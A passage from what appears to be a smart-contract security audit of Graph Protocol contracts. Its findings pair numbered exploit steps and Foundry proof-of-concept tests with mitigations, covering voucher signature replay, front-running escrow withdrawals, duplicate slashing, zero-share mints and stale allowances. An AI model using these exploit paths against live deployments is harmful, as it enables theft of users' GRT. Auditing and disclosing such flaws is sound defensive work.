        address attacker = address(0xB0B);
        L1StakingRewardHarness staking = new L1StakingRewardHarness();

        staking.seed(incumbent, 100 ether, 100 ether);
        uint256 pendingRewards = 1000 ether;
        uint256 incumbentWouldReceiveWithoutAttack = 1100 ether;

        staking.delegate(attacker, 900 ether);
        staking.collect(pendingRewards);
        uint256 attackerBridged = staking.transferDelegationToL2(attacker);

        uint256 attackerProfit = attackerBridged - 900 ether;
        uint256 incumbentAfterAttack = staking.claimable(incumbent);
        uint256 incumbentLoss = incumbentWouldReceiveWithoutAttack - incumbentAfterAttack;

        assertEq(attackerProfit, 900 ether);
        assertEq(incumbentAfterAttack, 200 ether);
        assertEq(incumbentLoss, 900 ether);
        assertGt(attackerProfit, 0);
    }
}


## Suggested Mitigation
Track rewards with a per-delegator reward index/rewardDebt or snapshot eligible pool shares at allocation/reward accrual time, then distribute only to shares that were present for the earning period. Additionally, prevent newly delegated shares from transferDelegationToL2() until after a minimum holding or reward-settlement epoch, or exclude same-epoch deposits from already-accrued rewards.


## [H-20]. Domainless AllocationExchange voucher signatures can be replayed across exchange deployments to double-collect GRT

## id: d9fHpGdoTBa4PKUJ90D_c

## Derived From Pattern/Invariant
PermitOrSignatureReplay / ReplayAcrossForksOrL2s: voucher signatures are not bound to contract or chain domain

## Exploit Type
SignatureReplay

## Location
AllocationExchange.redeem

## Finding Status: Valid
### Finding Status Justification: The vulnerable signature path exists in AllocationExchange._redeem: the digest is keccak256(abi.encodePacked(allocationID, amount)), recovered directly, and checked only against the local authority mapping. The signature omits address(this), chain ID, token address, staking address, nonce, expiry, and any domain separator. allocationsRedeemed is local to one contract instance, so it cannot mechanically prevent a valid signature from being accepted by another AllocationExchange instance with the same signer and compatible staking/allocation state. No complete safeguard in the shown code blocks cross-deployment replay. AllocationExchange is an in-scope production file. This does not require admin abuse by the attacker; governance configuring an authority is normal operation, while redemption is permissionless. The finding is not merely speculative because the root cause exists now in the deployed code pattern; exploitation requires a second funded compatible deployment/context, but that is an environmental precondition rather than a future code change.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
AllocationExchange authorizes vouchers with only allocationID and amount, so the same authority signature is valid in any AllocationExchange instance or chain that has the same authority enabled and has not locally marked that allocation as redeemed. The replay guard is local to one contract, so it does not stop cross-deployment or cross-domain replay. Vulnerable snippet: `bytes32 messageHash = keccak256(abi.encodePacked(_voucher.allocationID, _voucher.amount)); address voucherSigner = ECDSA.recover(messageHash, _voucher.signature); require(authority[voucherSigner], "Exchange: invalid signer"); allocationsRedeemed[_voucher.allocationID] = true; STAKING.collect(_voucher.amount, _voucher.allocationID);`. A voucher intended for one funded exchange can be submitted to another funded exchange using the same authority, causing the second exchange to pay the same allocation without that exchange-specific authorization.

## Impact
If a replacement, parallel, or cross-domain AllocationExchange reuses the same authority and holds GRT, any holder of a valid voucher can replay it to drain the same amount again from the unintended exchange into the chosen allocation. With sufficient balances this can cause significant direct loss of protocol-held GRT.

## Proof of Concept
1. Deploy two AllocationExchange instances with the same authority signer, GraphToken, and Staking mock. 2. Fund both exchanges and call approveAll on both. 3. The authority signs one raw voucher over keccak256(abi.encodePacked(allocationID, amount)) intended for exchange A. 4. A permissionless attacker calls redeem on exchange A, then reuses the exact same voucher on exchange B. 5. Both redemptions succeed because the signature contains no address(this), chainid, token, staking contract, nonce, expiry, or domain separator, and allocationsRedeemed is local to each deployment.

## Proof of Code
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../contracts/payments/AllocationExchange.sol";

contract MockGraphToken is IGraphToken {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external override returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockStaking is IStaking {
    MockGraphToken public token;
    mapping(address => uint256) public collected;
    constructor(MockGraphToken _token) { token = _token; }
    function collect(uint256 amount, address allocationID) external override {
        require(token.transferFrom(msg.sender, address(this), amount), "pull failed");
        collected[allocationID] += amount;
    }
}

contract AllocationExchangeReplayPoC is Test {
    function testSameVoucherReplaysAcrossExchangeInstances() external {
        uint256 authorityPk = 0xA11CE;
        address authority = vm.addr(authorityPk);
        address allocationID = address(0xBEEF);
        uint256 amount = 1_000_000 ether;

        MockGraphToken grt = new MockGraphToken();
        MockStaking staking = new MockStaking(grt);
        AllocationExchange exchangeA = new AllocationExchange(IGraphToken(address(grt)), IStaking(address(staking)), address(this), authority);
        AllocationExchange exchangeB = new AllocationExchange(IGraphToken(address(grt)), IStaking(address(staking)), address(this), authority);

        grt.mint(address(exchangeA), amount);
        grt.mint(address(exchangeB), amount);
        exchangeA.approveAll();
        exchangeB.approveAll();

        bytes32 digest = keccak256(abi.encodePacked(allocationID, amount));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(authorityPk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);
        AllocationExchange.AllocationVoucher memory voucher = AllocationExchange.AllocationVoucher(allocationID, amount, sig);

        exchangeA.redeem(voucher);
        exchangeB.redeem(voucher);

        assertEq(staking.collected(allocationID), amount * 2);
        assertEq(grt.balanceOf(address(exchangeB)), 0);
    }
}

## Suggested Mitigation
Use an EIP-712 domain separator or EIP-191 message that includes address(this), block.chainid, the GRT token, the staking contract, allocationID, amount, a nonce, and an expiry. Track consumed voucher hashes or nonces in addition to allocationsRedeemed, and reject signatures outside the current domain.


## [M-21]. Disputed indexer can reduce live stake before acceptance to shrink or avoid slashing

## id: Vm7DYifsPbVOBHMz0xaxO

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation

## Exploit Type
GlobalParamMidFlowManipulation

## Location
DisputeManager._slashIndexer

## Finding Status: Valid
### Finding Status Justification: The claimed root cause is present: Dispute storage records indexer, fisherman, deposit, relatedDisputeID, type, and status, but no slashable stake snapshot. _slashIndexer computes slashAmount from the current staking.getIndexerStakedTokens value at acceptance. If the value has fallen, the slash is reduced; if it rounds to zero, acceptance reverts. No complete safeguard is visible in DisputeManager. The needed stake movement is not shown to require a trusted role or victim error, and the precondition is not impossible from the supplied code and protocol context.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Dispute creation only checks that the indexer currently has nonzero stake, but the amount to slash is not snapshotted in dispute storage. acceptDispute() later calls _slashIndexer(), which rereads staking().getIndexerStakedTokens(_indexer) and computes slashAmount from that live value. If the disputed indexer can reduce withdrawable/current stake before arbitration, the accepted dispute slashes less than the stake that was at risk when the dispute was opened; if the live value rounds to zero, acceptDispute() reverts with Dispute has zero tokens to slash.

## Impact
A disputed indexer can lower the economic penalty after evidence is submitted, making accepted disputes slash an artificially reduced amount or forcing the arbitrator to draw/reject instead of accepting. This undermines dispute deterrence and can preserve stake that should have been slashable for invalid indexing or query behavior.

## Proof of Concept
1. A fisherman creates a dispute while the indexer has a large stake, satisfying the creation-time stake check. 2. Before arbitrator acceptance, the indexer reduces current stake through the staking system. 3. The arbitrator calls acceptDispute(). 4. _slashIndexer() uses the reduced live getIndexerStakedTokens value rather than a creation-time snapshot. 5. The indexer is slashed much less, or acceptDispute() reverts when the computed slashAmount is zero.

## Proof of Code
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract MockLiveStakeDisputeManager {
    enum Status { Null, Pending, Accepted }
    struct Dispute { address indexer; Status status; }
    mapping(bytes32 => Dispute) public disputes;
    mapping(address => uint256) public stake;
    uint256 public slashPpm = 500000;
    function setStake(address indexer, uint256 amount) external { stake[indexer] = amount; }
    function create(bytes32 id, address indexer) external { require(stake[indexer] > 0); disputes[id] = Dispute(indexer, Status.Pending); }
    function accept(bytes32 id) external {
        Dispute storage d = disputes[id];
        require(d.status == Status.Pending);
        uint256 slash = stake[d.indexer] * slashPpm / 1_000_000;
        require(slash > 0, "Dispute has zero tokens to slash");
        d.status = Status.Accepted;
        stake[d.indexer] -= slash;
    }
}
contract LiveStakeManipulationTest is Test {
    function testStakeReducedAfterDisputeMakesAcceptRevert() external {
        MockLiveStakeDisputeManager dm = new MockLiveStakeDisputeManager();
        address indexer = address(0x1);
        bytes32 id = keccak256("dispute");
        dm.setStake(indexer, 1000 ether);
        dm.create(id, indexer);
        dm.setStake(indexer, 1);
        vm.expectRevert(bytes("Dispute has zero tokens to slash"));
        dm.accept(id);
    }
}

## Suggested Mitigation
Snapshot the slashable stake or minimum slash amount when the dispute is created and enforce that amount at acceptance, or have the staking contract lock the disputed slashable stake until resolution. If live stake must be used, prevent stake withdrawals or reductions while unresolved disputes against the indexer/allocation exist.


## [H-22]. Collector can front-run matured PaymentsEscrow withdrawals and drain thawed escrow funds

## id: fOOcoBnp5dXZARRW7F0mX

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
FrontrunMev

## Location
PaymentsEscrow.collect

## Finding Status: Valid
### Finding Status Justification: The reported code path exists in the in-scope production contract PaymentsEscrow. thaw() records tokensThawing and thawEndTimestamp while leaving account.balance unchanged, and getBalance() treats tokensThawing as unavailable. withdraw() later lets the payer recover the thawed amount only after thawEndTimestamp < block.timestamp. However, collect() is callable by the tuple collector as msg.sender and checks only account.balance >= tokens, then subtracts tokens from balance and merely caps tokensThawing afterward. It does not enforce account.balance - tokensThawing, does not check thaw maturity, and does not block collection during or after thaw. Therefore a collector for the payer/collector/receiver tuple can order collect() before the payer's matured withdraw() and consume the same escrowed balance the payer expected to withdraw. The pause check, balance consistency check around GraphPayments, and post-collection thaw cap do not prevent this exact path. No provided documentation explicitly accepts collector capture of thawed funds as intentional. The finding is in an in-scope file and asset, does not depend on a future integration, and does not require admin/governance compromise or mere user misuse; it arises from inconsistent escrow accounting in current code.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`thaw()` appears to reserve `tokensThawing` for payer withdrawal after `WITHDRAW_ESCROW_THAWING_PERIOD`, and `getBalance()` reports thawing funds as unavailable. However, `collect()` does not use the same available-balance calculation and only checks raw `account.balance`, so the collector can collect the thawed amount even after the thaw has matured, as long as their transaction is ordered before the payer's `withdraw()`. Vulnerable snippet: `getBalance(): return account.balance > account.tokensThawing ? account.balance - account.tokensThawing : 0;` but `collect(): require(account.balance >= tokens, ...); account.balance -= tokens; if (account.tokensThawing > account.balance) { account.tokensThawing = account.balance; ... }`. This lets a tuple collector bypass the revocation/withdrawal maturity gate and capture funds that off-chain systems and payers would consider no longer collectible.

## Impact
A named collector can steal all thawed escrow funds from a payer tuple by front-running the payer's matured withdrawal. If high-value payers escrow more than $1M of GRT to a collector/receiver tuple, the bug can cause significant user funds to be lost directly from the in-scope PaymentsEscrow contract.

## Proof of Concept
1. Payer deposits 1,000,000 GRT into `escrowAccounts[payer][collector][receiver]`. 2. Payer calls `thaw(collector, receiver, amount)`, making `getBalance(payer, collector, receiver)` return 0 for the thawing amount. 3. After `WITHDRAW_ESCROW_THAWING_PERIOD` elapses, the payer submits `withdraw(collector, receiver)`. 4. The collector observes the withdrawal and submits `collect(..., payer, receiver, amount, ..., receiverDestination)` with higher priority. 5. Because `collect()` checks `account.balance` instead of `account.balance - account.tokensThawing`, it succeeds, transfers the thawed GRT through GraphPayments, clears the thaw state, and the payer's withdrawal can no longer recover the funds.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import "../contracts/payments/PaymentsEscrow.sol";
import { IGraphPayments } from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";

contract MockController {
    bool public paused;
    mapping(bytes32 => address) public proxies;
    function set(bytes memory name, address a) external { proxies[keccak256(name)] = a; }
    function getContractProxy(bytes32 id) external view returns (address) { return proxies[id]; }
}

contract MockGraphToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { uint256 allowed = allowance[from][msg.sender]; if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract MockGraphPayments {
    MockGraphToken public token;
    constructor(MockGraphToken t) { token = t; }
    function collect(IGraphPayments.PaymentTypes, address, uint256 tokens, address, uint256, address receiverDestination) external { token.transferFrom(msg.sender, receiverDestination, tokens); }
}

contract PaymentsEscrowMaturedWithdrawRacePoC is Test {
    PaymentsEscrow escrow;
    MockGraphToken token;
    MockController controller;
    MockGraphPayments payments;
    address payer = address(0xA11CE);
    address collector = address(0xB0B);
    address receiver = address(0xCAFE);
    address attackerDestination = address(0xD00D);
    uint256 amount = 1_000_000 ether;

    function setUp() public {
        token = new MockGraphToken();
        payments = new MockGraphPayments(token);
        controller = new MockController();
        controller.set("GraphToken", address(token));
        controller.set("GraphPayments", address(payments));
        controller.set("PaymentsEscrow", address(0x1111));
        controller.set("Staking", address(0x2222));
        controller.set("EpochManager", address(0x3333));
        controller.set("RewardsManager", address(0x4444));
        controller.set("GraphTokenGateway", address(0x5555));
        controller.set("GraphProxyAdmin", address(0x6666));
        controller.set("Curation", address(0x7777));
        escrow = new PaymentsEscrow(address(controller), 7 days);
        escrow.initialize();
        token.mint(payer, amount);
        vm.startPrank(payer);
        token.approve(address(escrow), amount);
        escrow.deposit(collector, receiver, amount);
        escrow.thaw(collector, receiver, amount);
        assertEq(escrow.getBalance(payer, collector, receiver), 0);
        vm.stopPrank();
    }

    function testCollectorFrontRunsMaturedWithdrawal() public {
        vm.warp(block.timestamp + 7 days + 1);
        vm.prank(collector);
        escrow.collect(IGraphPayments.PaymentTypes(0), payer, receiver, amount, address(0), 0, attackerDestination);
        assertEq(token.balanceOf(attackerDestination), amount);
        assertEq(token.balanceOf(payer), 0);
        assertEq(escrow.getBalance(payer, collector, receiver), 0);
    }
}


## Suggested Mitigation
Make `collect()` enforce the same available-balance semantics as `getBalance()` by checking only `account.balance - account.tokensThawing`, or explicitly reject collection from a tuple once its thaw has matured. For example: `uint256 collectible = account.balance > account.tokensThawing ? account.balance - account.tokensThawing : 0; require(collectible >= tokens, PaymentsEscrowInsufficientBalance(collectible, tokens));` before decrementing `account.balance`.


## [H-23]. Same query attestation can be replayed by different fishermen to slash an indexer multiple times

## id: dUiQBJS_ifmyMZDJJg8P3

## Derived From Pattern/Invariant
DoubleExecutionOrReplay / PermitOrSignatureReplay

## Exploit Type
SignatureReplay

## Location
DisputeManager.createQueryDisputeConflict

## Finding Status: Valid
### Finding Status Justification: The described replay path matches the code. Query dispute IDs include the caller-controlled fisherman, while the signed receipt does not bind fisherman and there is no consumed-attestation mapping. Different EOAs can therefore create distinct Pending disputes for the same attestation or conflict pair. acceptDispute resolves only one dispute ID and slashes through _slashIndexer each time. The related-dispute rejection only handles the paired conflict dispute, not duplicate pairs created by other fishermen. No complete safeguard or explicit accepted-risk documentation is shown.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Query dispute uniqueness is keyed by the fisherman, not by the signed attestation or receipt. The vulnerable ID construction is: `bytes32 disputeID = keccak256(abi.encodePacked(_attestation.requestCID, _attestation.responseCID, _attestation.subgraphDeploymentID, indexer, _fisherman)); require(!isDisputeCreated(disputeID));`. Because `_fisherman` is part of the key and there is no consumed-attestation/receipt mapping, the same signed evidence can create distinct pending disputes from different EOAs. In the zero-deposit conflict path, `createQueryDisputeConflict()` compounds this because every EOA can create a fresh linked pair for the same two conflicting attestations. If the arbitrator accepts the same side of each replayed pair as valid evidence, `acceptDispute()` calls `_slashIndexer()` each time and pays rewards each time, even though the underlying misconduct/evidence is identical.

## Impact
A single invalid or conflicting query receipt can cause repeated slashing of the same indexer stake and repeated fisherman rewards. With sufficiently large indexer stake and multiple replay submitters, this can move or destroy far more GRT than the intended one-time penalty for one piece of evidence.

## Proof of Concept
1. Obtain one invalid attestation, or two conflicting attestations with the same requestCID and subgraphDeploymentID. 2. Submit the evidence from fisherman A. 3. Submit the same evidence from fisherman B or many addresses; the dispute IDs differ because `_fisherman` is included. 4. The arbitrator accepts one dispute for each duplicate evidence set. 5. Each accepted duplicate independently executes `_slashIndexer()` and rewards that duplicate fisherman, draining the indexer repeatedly for the same receipt.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import 'forge-std/Test.sol';

contract StakingMock {
    mapping(address => uint256) public stake;
    mapping(address => uint256) public rewards;
    function setStake(address indexer, uint256 amount) external { stake[indexer] = amount; }
    function slash(address indexer, uint256 slashAmount, uint256 rewardAmount, address challenger) external {
        stake[indexer] -= slashAmount;
        rewards[challenger] += rewardAmount;
    }
}

contract DisputeManagerReplayHarness {
    uint256 constant MAX_PPM = 1_000_000;
    StakingMock public staking;
    uint256 public qrySlashingPercentage = 100_000;
    uint256 public fishermanRewardPercentage = 1_000_000;
    enum Status { Null, Pending, Accepted }
    struct Dispute { address indexer; address fisherman; Status status; }
    mapping(bytes32 => Dispute) public disputes;
    constructor(StakingMock s) { staking = s; }
    function create(bytes32 req, bytes32 resp, bytes32 sub, address indexer) external returns (bytes32 id) {
        id = keccak256(abi.encodePacked(req, resp, sub, indexer, msg.sender));
        require(disputes[id].status == Status.Null);
        require(staking.stake(indexer) > 0);
        disputes[id] = Dispute(indexer, msg.sender, Status.Pending);
    }
    function accept(bytes32 id) external {
        Dispute storage d = disputes[id];
        require(d.status == Status.Pending);
        d.status = Status.Accepted;
        uint256 slashAmount = staking.stake(d.indexer) * qrySlashingPercentage / MAX_PPM;
        uint256 rewardAmount = slashAmount * fishermanRewardPercentage / MAX_PPM;
        staking.slash(d.indexer, slashAmount, rewardAmount, d.fisherman);
    }
}

contract DuplicateAttestationReplayTest is Test {
    function testSameAttestationCanSlashTwiceForDifferentFishermen() public {
        StakingMock s = new StakingMock();
        DisputeManagerReplayHarness dm = new DisputeManagerReplayHarness(s);
        address indexer = address(0xA11CE);
        address alice = address(0xB0B);
        address bob = address(0xCAFE);
        s.setStake(indexer, 1_000_000 ether);
        bytes32 req = keccak256(bytes('req'));
        bytes32 resp = keccak256(bytes('bad-resp'));
        bytes32 sub = keccak256(bytes('sub'));
        vm.prank(alice);
        bytes32 id1 = dm.create(req, resp, sub, indexer);
        vm.prank(bob);
        bytes32 id2 = dm.create(req, resp, sub, indexer);
        assertTrue(id1 != id2);
        dm.accept(id1);
        dm.accept(id2);
        assertEq(s.stake(indexer), 810_000 ether);
        assertEq(s.rewards(alice), 100_000 ether);
        assertEq(s.rewards(bob), 90_000 ether);
    }
}

## Suggested Mitigation
Key query dispute uniqueness by the signed receipt/attestation identity independent of fisherman, for example `keccak256(requestCID,responseCID,subgraphDeploymentID,indexer)` for single-attestation disputes and a canonical pair hash for conflict disputes. Add `consumedReceipt` or `resolvedEvidence` storage and reject duplicate evidence across all fishermen before accepting deposits or creating conflict pairs.


## [M-24]. Stale l2Done is not reset on repeated L1 subgraph receive, permanently blocking L2 finalization

## id: _z9eHAOqQxc7tw62VOdvg

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
Dos

## Location
L2GNS._receiveSubgraphFromL1

## Finding Status: Valid
### Finding Status Justification: The relevant code path exists in in-scope L2GNS. finishSubgraphTransferFromL1 requires !transferData.l2Done and then sets l2Done = true. _receiveSubgraphFromL1 later overwrites transferData.tokens and subgraphReceivedOnL2BlockNumber and mints the NFT, but does not reset l2Done. Base GNS deprecateSubgraph burns the NFT and clears subgraphData fields, but the provided code does not clear subgraphL2TransferData. Therefore a later receive for the same aliased ID after deprecation can recreate the NFT while stale l2Done remains true, causing finalization to hit ALREADY_DONE. No complete safeguard, nonce, or transfer-data clearing is shown. The lifecycle uses ordinary owner/bridge actions, not privileged abuse or pure user error, and this can occur in current code.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
The L1-to-L2 transfer state is reused across subgraph lifecycles, but `_receiveSubgraphFromL1()` overwrites only `tokens` and `subgraphReceivedOnL2BlockNumber`; it never resets `transferData.l2Done`. Vulnerable snippet: `transferData.tokens = _tokens; transferData.subgraphReceivedOnL2BlockNumber = block.number; _mintNFT(_subgraphOwner, l2SubgraphID);`. After a previous receive was finalized, `finishSubgraphTransferFromL1()` set `transferData.l2Done = true`. If the subgraph is later deprecated, the NFT is burned but `subgraphL2TransferData` is not cleared. A subsequent receive for the same L1 subgraph ID can mint the NFT again while leaving `l2Done == true`, so `finishSubgraphTransferFromL1()` permanently reverts with `ALREADY_DONE`.

## Impact
A legitimate repeated bridge transfer for the same subgraph ID becomes unfinalizable. The newly bridged GRT recorded in `transferData.tokens` remains in L2GNS without a successful finalization path, and the subgraph remains disabled, causing a permanent lifecycle DoS and potential freezing of transferred subgraph funds.

## Proof of Concept
1. A subgraph is received from L1; `_receiveSubgraphFromL1()` stores transfer data. 2. The owner finalizes it; `finishSubgraphTransferFromL1()` sets `l2Done = true`. 3. The owner later deprecates the subgraph; base `deprecateSubgraph()` burns the NFT but does not clear `subgraphL2TransferData`. 4. The same L1 subgraph is received again after the NFT burn; `_receiveSubgraphFromL1()` writes new token/block data and mints the NFT, but leaves `l2Done = true`. 5. The owner attempts to finalize the new transfer and always hits `require(!transferData.l2Done, ALREADY_DONE)`.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import 'forge-std/Test.sol';

contract L2GNSReceiveHarness {
    struct TransferData { uint256 tokens; uint256 receivedBlock; bool l2Done; }
    mapping(uint256 => TransferData) public transferData;
    mapping(uint256 => bool) public disabled;
    mapping(uint256 => bool) public nftMinted;
    function receiveFromL1(uint256 l2SubgraphID, uint256 tokens) external {
        disabled[l2SubgraphID] = true;
        transferData[l2SubgraphID].tokens = tokens;
        transferData[l2SubgraphID].receivedBlock = block.number;
        nftMinted[l2SubgraphID] = true;
    }
    function finish(uint256 l2SubgraphID) external {
        TransferData storage data = transferData[l2SubgraphID];
        require(data.receivedBlock != 0, 'INVALID_SUBGRAPH');
        require(!data.l2Done, 'ALREADY_DONE');
        data.l2Done = true;
        disabled[l2SubgraphID] = false;
    }
    function deprecate(uint256 l2SubgraphID) external {
        disabled[l2SubgraphID] = true;
        nftMinted[l2SubgraphID] = false;
    }
}

contract L2GNSStaleL2DoneTest is Test {
    function test_secondReceiveCannotBeFinalizedBecauseL2DoneWasNotReset() external {
        L2GNSReceiveHarness gns = new L2GNSReceiveHarness();
        uint256 id = 123;
        gns.receiveFromL1(id, 100 ether);
        gns.finish(id);
        gns.deprecate(id);
        gns.receiveFromL1(id, 200 ether);
        (, , bool l2Done) = gns.transferData(id);
        assertEq(l2Done, true);
        vm.expectRevert(bytes('ALREADY_DONE'));
        gns.finish(id);
    }
}

## Suggested Mitigation
Reset the per-transfer lifecycle fields when accepting a new receive. `_receiveSubgraphFromL1()` should set `transferData.l2Done = false` before minting the NFT, and deprecation should either clear obsolete L2 transfer data or include a transfer nonce so stale finalization state cannot affect a later receive.


## [L-25]. mint() accepts positive deposits that mint zero GCS in existing curated pools

## id: euxUG3JwToko9Ql-mZLP-

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
RoundingError

## Location
L2Curation.mint

## Finding Status: Valid
### Finding Status Justification: The vulnerable path exists in in-scope L2Curation.mint. For an already curated pool, tokensToSignal applies tax and then _tokensToSignal returns getCurationPoolSignal(id) * tokensAfterTax / curationPool.tokens using floor division. If the product is smaller than pool tokens, signalOut is zero. mint only requires _tokensIn != 0 and signalOut >= _signalOutMin, so _signalOutMin == 0 permits a positive transfer, burns any tax, adds net tokens to pool.tokens, and mints zero GCS. No code requires signalOut > 0. The slippage parameter is only caller-controlled partial protection, not a complete protocol safeguard. The behavior is not explicitly documented as an accepted risk, is in production in-scope code, and is currently reachable permissionlessly. Although a caller or integration must allow zero minimum signal, the protocol still accepts a positive-token zero-share mint, so this is not solely user mistake without protocol fault.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
For existing pools, _tokensToSignal() floors the share calculation and mint() only checks the user-supplied _signalOutMin. If _signalOutMin is zero, a positive deposit can be accepted while minting zero GCS:

return getCurationPoolSignal(_subgraphDeploymentID).mul(_tokensIn).div(curationPool.tokens);

...
require(signalOut >= _signalOutMin, "Slippage protection");
...
curationPool.tokens = curationPool.tokens.add(_tokensIn.sub(curationTax));
curationPool.gcs.mint(curator, signalOut);

When getCurationPoolSignal(id) * netTokensIn < pools[id].tokens, signalOut is zero, but the user's GRT is still pulled and added to the pool reserve.

## Impact
Integrations or users that pass _signalOutMin = 0 can lose their full positive deposit while receiving no curation shares. Existing signal holders receive the donated reserve value through a higher GRT-per-GCS rate.

## Proof of Concept
1. A pool exists with 1 wei of GCS supply and 1 ether of GRT reserves.
2. A later curator calls mint() with a small positive _tokensIn and _signalOutMin = 0.
3. _tokensToSignal() computes 1 * _tokensIn / 1 ether, which floors to zero for _tokensIn < 1 ether.
4. mint() accepts signalOut == 0 because the caller's minimum is zero.
5. The user's GRT is pulled into the pool, but their GCS balance remains unchanged.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract CurationZeroSignalModel {
    uint256 public poolTokens = 1 ether;
    uint256 public poolSignal = 1;
    mapping(address => uint256) public signalBalance;

    constructor(address incumbent) { signalBalance[incumbent] = 1; }

    function tokensToSignal(uint256 tokensIn) public view returns (uint256) {
        return poolSignal * tokensIn / poolTokens;
    }

    function mint(uint256 tokensIn, uint256 signalOutMin) external returns (uint256 signalOut) {
        require(tokensIn != 0, "zero");
        signalOut = tokensToSignal(tokensIn);
        require(signalOut >= signalOutMin, "slippage");
        poolTokens += tokensIn;
        poolSignal += signalOut;
        signalBalance[msg.sender] += signalOut;
    }
}

contract L2CurationZeroSignalMintPoC is Test {
    function testPositiveMintCanMintZeroSignal() external {
        address incumbent = address(0x1);
        address victim = address(0x2);
        CurationZeroSignalModel c = new CurationZeroSignalModel(incumbent);

        vm.prank(victim);
        uint256 signalOut = c.mint(1 wei, 0);

        assertEq(signalOut, 0);
        assertEq(c.signalBalance(victim), 0);
        assertEq(c.poolTokens(), 1 ether + 1 wei);
        assertEq(c.poolSignal(), 1);
    }
}

## Suggested Mitigation
Require signalOut > 0 for every successful positive-token mint, or enforce a minimum deposit for existing pools equal to the smallest amount that can mint at least one wei of GCS. Keep the existing _signalOutMin check as additional slippage protection.


## [H-26]. Removed token destinations retain max allowance and can still pull locked wallet GRT

## id: YcK3rO_6x_sv1qcuaa11M

## Derived From Pattern/Invariant
AccessControlOrAuthByPass: removed token destinations keep previously granted wallet allowance

## Exploit Type
AccessControl

## Location
GraphTokenLockManager / GraphTokenLockWallet.removeTokenDestination / approveProtocol / revokeProtocol

## Finding Status: Valid
### Finding Status Justification: approveProtocol, removeTokenDestination, and revokeProtocol interact exactly as claimed: max allowance is granted to a destination, removal only updates the manager set, and revocation zeros only current destinations. ERC20 allowance for the removed destination remains. This is scoped production code with no complete stale-allowance safeguard.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
approveProtocol() grants type(uint256).max allowance from the wallet to every current manager destination. removeTokenDestination() only removes the destination from _tokenDestinations and does not clear allowances from existing wallets. revokeProtocol() later iterates only the current destination list, so it cannot revoke a removed destination. Vulnerable snippets: approveProtocol loops manager.getTokenDestinations() and token.approve(dstList[i], type(uint256).max); removeTokenDestination only calls _tokenDestinations.remove(_dst); revokeProtocol loops the current destination list and approves 0 only for those entries.

## Impact
A previously authorized destination remains able to transfer locked GRT from any wallet that approved it, even after governance removes it from the manager allowlist. If the removed destination exposes a pull path or is deprecated/compromised, locked funds can be moved contrary to the current authorization state.

## Proof of Concept
1. The manager has destination D in _tokenDestinations. 2. A wallet beneficiary calls approveProtocol(), giving D max allowance from the lock wallet. 3. The manager owner removes D with removeTokenDestination(D). 4. manager.isTokenDestination(D) is false, but token.allowance(wallet,D) remains max. 5. D, or any caller of D's pull function, calls transferFrom(wallet, attacker, amount) and drains locked GRT despite removal.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";
contract MockERC20 { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; uint256 public totalSupply; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; totalSupply+=amount; } function transfer(address to,uint256 amount) external returns(bool){ require(balanceOf[msg.sender]>=amount); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } function approve(address spender,uint256 amount) external returns(bool){ allowance[msg.sender][spender]=amount; return true; } function transferFrom(address from,address to,uint256 amount) external returns(bool){ require(balanceOf[from]>=amount); require(allowance[from][msg.sender]>=amount); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; } }
contract PullDestination { function pull(MockERC20 token,address from,address to,uint256 amount) external { token.transferFrom(from,to,amount); } }
